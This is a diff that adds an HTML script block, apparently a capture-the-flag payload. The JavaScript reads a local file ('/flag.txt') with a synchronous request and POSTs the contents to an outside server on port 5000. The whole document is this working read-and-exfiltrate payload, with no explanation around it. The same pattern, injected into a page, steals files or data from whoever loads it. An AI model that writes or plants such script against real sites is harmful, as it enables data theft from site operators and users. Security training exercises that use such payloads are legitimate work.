@@ -1,0 +1,26 @@
+<script>
+function sendOut(text) {
+  var http = new XMLHttpRequest();
+  http.open("POST", "http://jcunniff.net:5000", false);
+  http.send(text);
+}
+
+function pwn(file)
+{
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                sendOut(rawFile.responseText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+
+pwn('/flag.txt');
+</script>
